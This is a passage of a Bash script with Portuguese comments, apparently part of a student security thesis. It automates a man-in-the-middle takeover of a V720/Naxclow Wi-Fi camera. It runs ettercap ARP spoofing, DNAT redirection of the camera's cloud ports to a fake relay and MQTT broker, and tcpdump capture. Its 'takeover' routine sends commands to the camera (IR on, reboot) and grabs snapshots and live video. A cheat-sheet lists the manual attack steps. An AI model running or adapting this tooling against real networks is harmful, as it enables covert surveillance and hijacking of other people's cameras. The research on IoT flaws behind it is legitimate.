  echo "=================================================================="
  echo " So prosseguir se ESTE equipamento e ESTA rede sao teus / autorizados."
  read -r -p " Digitar 'SIM' para continuar: " CONFIRM
  [[ "$CONFIRM" == "SIM" ]] || { echo "abortado."; exit 1; }

  say "[1/3] fake server (relay) -> $(log_of server)"
  if (( IS_MAC )); then
    start_bg server "cd '$REPO_ROOT' && PYTHONPATH='$PYPATH_USER' FAKE_SRV_HOST=$MY_IP RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
  else
    start_bg server "cd '$REPO_ROOT' && FAKE_SRV_HOST=$MY_IP RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
  fi
  wait_port "$RELAY_PORT" 10 && ok "fake relay LISTEN :$RELAY_PORT" || warn "fake relay nao subiu em :$RELAY_PORT — '$0 logs server'"

  say "[2/3] ARP spoof (sem DNS spoof) + DNAT relay-only"
  ORIG_FWD=$(sysctl -n "$(fwd_sysctl)")
  echo "$ORIG_FWD" > "$RUN_DIR/orig_ip_forward"
  sysctl -w "$(fwd_sysctl)=1" >/dev/null
  start_bg ettercap "'$ETTERCAP' -T -q -i '$IFACE' -M arp:remote '/$CAM_IP//' '/$GW_IP//'"
  sleep 4
  alive ettercap || { say; tail -n 15 "$(log_of ettercap)" | sed 's/^/    /'; die "ettercap morreu no arranque — '$0 logs ettercap'"; }
  dnat_rules_on
  ok "DNAT relay-only ativo (29939-29942 -> ${DNAT_TARGET:-$MY_IP}:$RELAY_PORT)"

  say "[3/3] captura -> $PCAP (so host $CAM_IP)"
  start_bg pcap "exec '$TCPDUMP' -i '$IFACE' -n -U host '$CAM_IP' -w '$PCAP'"

  echo
  ok "no ar. Agora: abrir o viewer da camera no app V720 (deixar streamar ~30s)."
  say "   acompanhar:  $0 watch"
  say "   status:      $0 status"
  say "   derrubar:    $0 down"
}

# --------------------------------------------------------------- status
cmd_status() {
  MY_IP=$(my_ip)
  printf '%-10s  %-6s  %-7s  %s\n' SERVICO ESTADO PID LOG
  local s p st
  for s in "${SERVICES[@]}"; do
    p=$(cat "$(pid_of "$s")" 2>/dev/null || echo -)
    if alive "$s"; then st="${c_grn}up  ${c_rst}"; else st="${c_red}down${c_rst}"; p=-; fi
    printf '%-10s  %b  %-7s  %s\n' "$s" "$st" "$p" "$(log_of "$s")"
  done
  echo
  say "portas:"
  local pt
  for pt in 80 1883 "$RELAY_PORT"; do
    port_listen "$pt" && say "  :$pt LISTEN" || say "  :$pt —"
  done
  say "DNAT (por porta, cobre pool de IPs):"
  if [[ -n "$MY_IP" ]] && dnat_active; then
    say "  ATIVO  (80/1883/29939-29942 -> ${DNAT_TARGET:-$MY_IP})"
  else
    say "  inativo"
  fi
  say "alvos:"
  say "  camera $CAM_IP   gateway $GW_IP   atacante ${MY_IP:-?} ($IFACE)"
  echo
  say "ultimas linhas de cada log:"
  for s in "${SERVICES[@]}"; do
    printf '  %s--- %s ---%s\n' "$c_dim" "$s" "$c_rst"
    tail -n 3 "$(log_of "$s")" 2>/dev/null | sed 's/^/    /'
  done
  return 0
}

# --------------------------------------------------------------- logs
cmd_logs() {  # [nome] [N]
  local names=() n=40 a
  for a in "$@"; do
    if [[ "$a" =~ ^[0-9]+$ ]]; then n=$a
    elif [[ "$a" == all ]]; then n=0
    else names+=("$a"); fi
  done
  ((${#names[@]})) || names=("${SERVICES[@]}")
  for s in "${names[@]}"; do
    local f; f=$(log_of "$s")
    [[ -f "$f" ]] || { warn "sem log '$s'"; continue; }
    printf '\n========== %s  (%s)  ==========\n' "$s" "$( [[ $n -eq 0 ]] && echo 'log inteiro' || echo "ultimas $n linhas" )"
    if [[ $n -eq 0 ]]; then cat "$f"; else tail -n "$n" "$f"; fi
  done
  return 0
}

# --------------------------------------------------------------- watch
cmd_watch() {  # [nome...]
  local files=() s
  if (($#)); then for s in "$@"; do files+=("$(log_of "$s")"); done
  else for s in "${SERVICES[@]}"; do files+=("$(log_of "$s")"); done; fi
  say "tail -f  (Ctrl-C sai; nao mata nada)"
  tail -n 5 -F "${files[@]}"
}

# --------------------------------------------------------------- bundle
cmd_bundle() {
  local out="$OUT_DIR/report_$(date +%Y%m%d_%H%M%S).txt"
  {
    echo "### mitm_dns bundle  $(date +%Y-%m-%dT%H:%M:%S%z)  OS=$OS"
    echo "### CAM_IP=$CAM_IP GW_IP=$GW_IP IFACE=$IFACE DEV=$DEV RELAY_PORT=$RELAY_PORT"
    echo; echo "===== STATUS ====="; cmd_status
    echo; echo "===== etter.dns ====="; cat "$(etter_dns_path)" 2>/dev/null
    if (( IS_MAC )); then
      echo; echo "===== pf anchor mitm_dns ====="; pfctl -a mitm_dns -s nat 2>/dev/null
    else
      echo; echo "===== iptables -t nat -L PREROUTING -n -v ====="; iptables -t nat -L PREROUTING -n -v 2>/dev/null
    fi
    echo; echo "===== pcap ====="; ls -la "$PCAP" 2>/dev/null
    for s in "${SERVICES[@]}"; do
      echo; echo "===== LOG: $s ====="; cat "$(log_of "$s")" 2>/dev/null
    done
    local f
    for f in "$OUT_DIR"/takeover_*.log; do
      [[ -e "$f" ]] || continue
      echo; echo "===== TAKEOVER: $(basename "$f") ====="; cat "$f" 2>/dev/null
    done
  } | sed -E 's/\x1b\[[0-9;]*m//g' > "$out"
  ok "gerado: $out"
}

# --------------------------------------------------------------- cheat
cmd_cheat() {
  cat <<EOF
================  mitm_dns — passos manuais  ================
  camera=$CAM_IP  gateway=$GW_IP  iface=$IFACE  DEV=$DEV  SO=$OS

  NO PC (na WiFi de casa):
    1. conecta na mesma WiFi da camera; confere teu IP:
       $( (( IS_MAC )) && echo "ipconfig getifaddr $IFACE" || echo "ip -4 addr show $IFACE" )
    2. sudo $0 up          (digita SIM)
    3. $0 watch            (num terminal a parte)

  NA CAMERA (unica acao fisica):
    4. power cycle (tirar/recolocar da tomada)
       (a camera ignora ping — nao usa ping pra testar; ela responde ARP)

  VALIDACAO (checkpoints, em ordem):
    A. DNS spoof mordeu:   $0 logs ettercap   -> 'dns_spoof' respondendo query naxclow
                           $0 logs server     -> HTTP getA9ConfCheck da camera
    B. registro MQTT:      $0 logs mosquitto  -> New client ... as $DEV
                                                + SUBSCRIBE .../Device/sub/$DEV
    A ok mas B nao? camera fala com o cloud por IP fixo:
       sudo $0 dnat on   + power cycle de novo (observa logs de novo)

  TAKEOVER (depois do checkpoint B):
    sudo $0 takeover                       # ir on + reboot + coleta resposta + tenta stream
    sudo $0 takeover --no-stream 'ir on'   # so MQTT, comando custom
    artefatos: $OUT_DIR/takeover_<data>.{log,json,jpg,mjpg}

  STREAM (so se o relay :$RELAY_PORT registrar):
    http://127.0.0.1/dev/list
    http://127.0.0.1/dev/<id>/live       (<id> sai em '$0 logs server')
    extracao:  python3 scripts/utils/extract_mitm_video.py $PCAP --out $OUT_DIR/extract --cam-ip $CAM_IP

  BONUS (fecha a pendencia do achados_sta — stream em STA com viewer aberto):
    sessao separada, SEM DNS spoof (depois do 'down'):
    sudo ./scripts/mitm/mitm_auto.sh $CAM_IP $GW_IP $IFACE 300 mitm_stream_run
    (abre o viewer no app V720 durante a captura)

  FIM:
    sudo $0 bundle        # pacote de evidencias pro TCC
    sudo $0 down          # restaura tudo; confirma a camera online no app
=============================================================
EOF
}

# --------------------------------------------------------------- takeover
cmd_takeover() {
  local do_stream=1
  [[ "${1:-}" == "--no-stream" ]] && { do_stream=0; shift; }
  local cmds="${*:-$TAKEOVER_CMDS}"

  check_deps
  alive mosquitto || die "broker MQTT nao esta no ar — 'sudo $0 up' primeiro"
  alive server    || warn "fake server nao esta vivo ('logs server') — prova de stream provavelmente falha"

  MY_IP=$(my_ip)

  local stamp; stamp=$(date +%Y%m%d_%H%M%S)
  local proof="$OUT_DIR/takeover_${stamp}.log"
  local snap="$OUT_DIR/takeover_${stamp}.jpg"
  local mjpg="$OUT_DIR/takeover_${stamp}.mjpg"

  say "================  TAKEOVER (MQTT + stream)  ================"
  say "  DEV=$DEV  BROKER=$MY_IP  comandos: ${cmds//;/  |  }"
  say "  prova MQTT (com timestamp): $proof"

  : > "$(log_of proof)"
  start_bg proof "exec '$MOSQ_SUB' -h $MY_IP -t 'Naxclow/#' -F '%I  %t  %p'"
  sleep 1

  say
  say "[A] esperando a camera conectar/reconectar ..."
  if ! wait_online; then
    stop_bg proof
    die "camera $DEV nao apareceu no MQTT em ${ONLINE_TIMEOUT}s. Power cycle feito? Checkpoint B ok? ('$0 logs mosquitto')"
  fi

  baseline_info "$(log_of proof)" || true

  local sent_log="$OUT_DIR/takeover_${stamp}_sent.log"
  : > "$sent_log"

  local -a steps=(); local c
  IFS=';' read -ra steps <<< "$cmds"
  for c in "${steps[@]}"; do
    c="${c#"${c%%[![:space:]]*}"}"; c="${c%"${c##*[![:space:]]}"}"   # trim
    [[ -n "$c" ]] || continue
    cam_online 20 || { warn "camera caiu — reesperando antes de '$c'"; wait_online || { warn "desisti de '$c'"; break; }; }
    say "  -> $c"
    printf '%s  >>> ENVIADO: %s\n' "$(date +%H:%M:%S)" "$c" >> "$sent_log"
    ( cd "$REPO_ROOT" && BROKER="$MY_IP" DEV="$DEV" "$CMD_SCRIPT" $c ) 2>&1 | sed 's/^/     /'
    sleep 2
  done

  say "  coletando resposta da camera por ${RESP_WAIT}s ..."
  sleep "$RESP_WAIT"

  say
  say "  --- respostas da camera (topicos != /sub/ que publicamos) ---"
  grep -avE "Device/sub/${DEV}" "$(log_of proof)" | grep -aE 'Device/|>>> ENVIADO' | tail -40 | sed 's/^/    /' \
    || warn "nada da camera no proof — ela pode ter reconectado fora da janela"
  diff_info "$(log_of proof)" || true

  if (( do_stream )); then
    say
    say "[B] prova de stream"
    say "  esperando a camera voltar (reboot leva ~30-60s) ..."
    if wait_online; then
      if p2p_registered || p2p_watch; then
        local id i
        for ((i=0;i<15;i++)); do id=$(dev_stream_id); [[ -n "$id" ]] && break; sleep 2; done
        curl -s --max-time 3 "http://127.0.0.1/dev/list" -o "$OUT_DIR/takeover_${stamp}_devlist.json" 2>/dev/null || true
        if [[ -n "$id" ]]; then
          ok "  <id> do stream: $id"
          curl -s --max-time 8 "http://127.0.0.1/dev/$id/snapshot" -o "$snap" 2>/dev/null \
            && [[ -s "$snap" ]] && ok "  snapshot -> $snap" || { warn "  snapshot vazio/falhou"; rm -f "$snap"; }
          say "  capturando /live por ${STREAM_SECS}s ..."
          curl -s --max-time "$STREAM_SECS" "http://127.0.0.1/dev/$id/live" -o "$mjpg" 2>/dev/null || true
          [[ -s "$mjpg" ]] && ok "  live bruto -> $mjpg" || { warn "  /live nao rendeu bytes"; rm -f "$mjpg"; }
          say "  stream tambem esta no pcap principal: $PCAP"
          say "  extrair: python3 scripts/utils/extract_mitm_video.py '$PCAP' --out '$OUT_DIR/extract_$stamp' --cam-ip '$CAM_IP'"
        else
          warn "  nao consegui o <id> (server.log sem 'registration request' e /dev/list vazio)."
          warn "  ver 'Status final' em docs/achados_fakeserver.md (camera nao abre o canal de dados)"
        fi
      else
        warn "  camera nao registrou no relay :${RELAY_PORT} do fake server (${P2P_WAIT}s)."
        warn "  Sem registro P2P nao ha stream — mas o takeover MQTT ja e a prova do cenario."
        warn "  Se ainda nao fez: sudo $0 dnat on + power cycle, e tenta de novo."
      fi
    else
      warn "  camera nao voltou em ${ONLINE_TIMEOUT}s — pula a prova de stream"
    fi
  fi

  stop_bg proof
  cp -f "$(log_of proof)" "$proof" 2>/dev/null || true
  cp -f "$sent_log" "$OUT_DIR/takeover_${stamp}_sent.log" 2>/dev/null || true

  say
  ok "takeover terminou. Artefatos:"
  ls -1 "$OUT_DIR"/takeover_"${stamp}"* 2>/dev/null | sed 's/^/    /'
  say "  junta tudo num arquivo:  sudo $0 bundle"
}

# --------------------------------------------------------------- main
case "${1:-}" in
  up)       need_root; cmd_up ;;
  down)     need_root; cmd_down ;;
  restart)  need_root; cmd_down; echo; sleep 2; cmd_up ;;
  dnat)     shift; need_root; cmd_dnat "${1:-}" ;;
  relay)    shift; need_root; cmd_relay ;;
  takeover) shift; need_root; cmd_takeover "$@" ;;
  status)   cmd_status ;;
  logs)     shift; cmd_logs "$@" ;;
  watch)    shift; cmd_watch "$@" ;;
  bundle)   need_root; cmd_bundle ;;
  cheat)    cmd_cheat ;;
  *)        usage; exit 1 ;;
esac
